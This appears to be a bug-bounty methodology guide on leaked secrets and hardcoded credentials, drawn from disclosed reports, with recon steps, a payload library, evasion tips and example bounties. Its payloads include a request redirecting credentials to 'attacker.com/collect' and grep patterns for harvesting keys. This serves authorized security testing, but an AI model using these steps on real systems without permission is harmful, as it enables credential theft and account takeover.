---
category: secrets
label: Secrets & Hardcoded Credentials
report_count: 251
programs: [security, ibb, slack, elastic, mozilla, shopify, zenly, brave, rockstargames, x]
avg_bounty: 1200
max_bounty: 20000
severity_distribution: critical: 2, high: 7, medium: 13, low: 16, none: 4
---

## Overview

Secrets exposures break the core invariant that authentication and authorization tokens, cryptographic keys, and sensitive configuration are only accessible to trusted parties. Developers repeatedly introduce these bugs through accidental code commits, misconfigured storage, insecure transmission, and improper logging. The worst-case impact is full account takeover, infrastructure compromise, or mass data exfiltration—often with minimal attacker effort.

## Root causes

- Hardcoded secrets or credentials in source code, config files, or binaries, often committed to public repositories.
- Insecure storage of secrets in logs, database fields, or world-readable files.
- Transmission of credentials or tokens over unencrypted channels (HTTP, email, logs).
- Automatic credential injection into third-party or attacker-controlled endpoints (e.g., via redirects or unvalidated URLs).
- Failure to scrub secrets from crash reports, debug output, or error messages.
- Use of default, public, or shared cryptographic keys/certificates.

## Attack surface

- Source code repositories (public or internal): look for config files, scripts, or code with embedded secrets.
- Mobile and desktop app binaries: decompile or extract resources to find hardcoded keys or tokens.
- API endpoints returning sensitive data in JSON/XML (e.g., password fields, tokens).
- Log files, debug endpoints, or rendered templates containing secrets.
- Redirect flows (OAuth, SSO, file downloads) that may forward credentials to attacker-controlled URLs.
- HTTP headers (Authorization, Cookie, X-API-Key) and body fields in requests/responses.
- Publicly accessible storage (S3 buckets, GDrive, PDFs, spreadsheets) containing sensitive information.
- Features involving file exports, password resets, or user invitations.
- Frameworks with insecure default credential handling (e.g., Rails secret_key_base, Django SECRET_KEY).
- Client-side JS referencing API keys or secrets in cleartext.

## Recon checklist

1. Enumerate all public and internal code repositories for config files, scripts, and environment files.
2. Decompile mobile/desktop apps to extract embedded strings and resources.
3. Crawl for public files (PDFs, spreadsheets, logs) and enumerate open directories.
4. Review JavaScript and source maps for embedded keys or tokens.
5. Map API endpoints and inspect responses for credential fields or sensitive headers.
6. Analyze redirect flows for credential forwarding (especially OAuth, SSO, file downloads).
7. Check logs, rendered templates, and debug endpoints for secrets exposure.
8. Inspect network traffic for credentials sent over HTTP or included in URLs.

## Hunt methodology

1. Search code and config files for patterns matching API keys, tokens, passwords, and cryptographic material.
2. Decompile binaries and grep for credential patterns or suspicious strings.
3. Intercept and analyze HTTP(S) traffic for credentials in headers, body, or URLs.
4. Trigger error conditions and review logs, debug output, and crash reports for secrets.
5. Test redirect and download flows with attacker-controlled endpoints to capture credential injection.
6. Enumerate public storage and file shares for sensitive documents or exports.
7. Review rendered templates and UI elements for unmasked secrets.
8. Validate discovered secrets by attempting authentication or privileged actions.

## Payload library

### Source Code/Config Disclosure
**Technique**: Secrets are hardcoded in source, config, or environment files and exposed via public repositories or file leaks.
**How to apply**: Search for files containing patterns like `api_key`, `secret`, `token`, `password`, or cryptographic material in code, config, or environment files.
**Payload**:  
```
grep -E 'api[_-]?key|secret|token|password|PRIVATE KEY' {repo_or_file}
```
**Observe**: Discovery of valid credentials, tokens, or keys in plaintext.
**Seen in**: Public GitHub repos for SDKs, Rails/Django config files, mobile app decompilation.

### Credential Injection via Redirect/Download
**Technique**: Application automatically injects credentials into requests to untrusted or attacker-controlled URLs.
**How to apply**: Manipulate parameters like `{redirect_url}`, `{download_url}`, or similar to point to an attacker-controlled endpoint; observe if credentials are sent.
**Payload**:  
```
POST /api/endpoint { "downloadUrl": "https://attacker.com/collect" }
```
**Observe**: Authorization headers, cookies, or tokens received on the attacker endpoint.
**Seen in**: File download features, OAuth/SSO redirect flows, federated sharing.

### Insecure Transmission (HTTP/Email/Logs)
**Technique**: Credentials are transmitted over unencrypted channels or stored in logs.
**How to apply**: Intercept network traffic or review logs for credentials sent in cleartext (HTTP, email, or log files).
**Payload**:  
```
curl -v -H "Authorization: Bearer {token}" http://target.com/api/endpoint
```
**Observe**: Credentials visible in intercepted traffic or log files.
**Seen in**: Login forms on HTTP, password reset emails, application logs.

### Hardcoded Secrets in Binaries
**Technique**: Secrets are embedded in compiled binaries or app resources.
**How to apply**: Decompile or extract strings from binaries; search for credential patterns.
**Payload**:  
```
strings {binary} | grep -iE 'key|token|secret|password'
```
**Observe**: Discovery of valid secrets or tokens.
**Seen in**: Mobile/desktop apps, CLI tools, SDKs.

### Unmasked Secrets in Rendered Templates/Debug Output
**Technique**: Secrets are rendered in templates, logs, or debug output due to missing masking or filtering.
**How to apply**: Trigger actions that generate rendered templates, error logs, or debug output; inspect for secrets.
**Payload**:  
```
POST /api/endpoint { "action": "trigger_error", "password": "{value}" }
```
**Observe**: Secret values appear in UI, logs, or debug output.
**Seen in**: Async search features, Airflow rendered templates, error logs.

## Filter & WAF bypass

- Use alternate encodings (Base64, hex, Unicode) to bypass simple pattern matching.
- Split secrets across multiple lines or variables to evade static regexes.
- Use uncommon parameter names or nested JSON to hide secrets.
- For HTTP header injection, use case variations (`authorization`, `Authorization`, `AUTHORIZATION`).
- For log/file exfiltration, exploit log rotation or file upload features to leak secrets.

## Verification & impact

- **Confirmed vulnerable**: Ability to authenticate, escalate privileges, or access sensitive data using the discovered secret; or evidence of secret transmission to attacker-controlled endpoint.
- **False positive signals**: Expired, revoked, or demo/test credentials; secrets with limited or no privileges; secrets in non-production/test environments.
- **Impact escalation**: Use secrets for account takeover, privilege escalation, lateral movement, infrastructure compromise, or mass data exfiltration.

## Triage & severity

- Typical CVSS: Medium to Critical (4.0–10.0), depending on privilege and exploitability.
- Severity increases if: credential grants admin access, affects production, enables account takeover, or is exposed to unauthenticated users.
- Severity decreases if: credential is non-production, quickly revoked, or protected by additional controls (IP allowlist, MFA).

## Reporting tips

- Include exact location of the secret (file, line, endpoint, log, etc.).
- Provide a working PoC: demonstrate authentication, privilege escalation, or data access using the secret.
- State the impact: what can be done with the secret, and whether it is still valid.
- Avoid reporting expired, demo, or non-sensitive secrets.
- Checklist: secret location, proof of validity, impact statement, reproduction steps, evidence (screenshots, logs, traffic captures).

## Real examples

- 745324 — security: Account takeover via session cookie leak in report comment (high, $20000)
- 531032 — slack: Publicly known DTLS private key enables SRTP stream hijack (high, $2000)
- 2137154 — mozilla: Admin API key disclosed in Slack channel, full admin access to Mastodon staging (high, $1000)
- 812585 — deptofdefense: PII (names, emails, ranks) leaked in public PDF on Navy website (high, undisclosed)
- 456997 — grab: Production secret_key_base leaked in public GitHub repo (high, undisclosed)
- 674774 — x: AppLovin API key hardcoded in public GitHub repo (high, $280)
- 1042716 — elastic: Authorization headers stored in cleartext in async search index (medium, $1000)
- 1047125 — stripo: Non-revoked API key disclosed in public bug bounty report (medium, undisclosed)
- 1551586 — ibb: curl/libcurl leaks credentials on cross-protocol redirect (medium, $2400)
- 3400143 — nextcloud: Credential disclosure via unvalidated directDownloadUrl (medium, $250)
- 1700734 — shopify: OAuth authorization code intercepted via deep link, no PKCE (low, $900)
- 2337938 — sheer_bbp: Password sent in cleartext via email after signup (low, $200)
- 519367 — midpoint_h1c: Passwords stored as plaintext in log data (low, $168.68)
- 238260 — slack: Uninstall/reinstall leaves session active, no credential wipe (low, $500)
- 874017 — deptofdefense: SSN exposed on public slide, not properly redacted (critical, undisclosed)
- 396467 — snapchat: GitHub token leaked in public repo, potential internal access (critical, undisclosed)

## Bounty intelligence

Payouts for secrets exposures range from $100 for low-impact or test credentials up to $20,000 for production session tokens or admin keys enabling account takeover. Programs in SaaS, cloud, and infrastructure sectors pay the most for secrets that enable privilege escalation or mass compromise. Reports with working PoCs, clear impact, and evidence of production exposure consistently earn higher rewards; test/demo credentials or non-exploitable leaks are often marked as informative or N/A.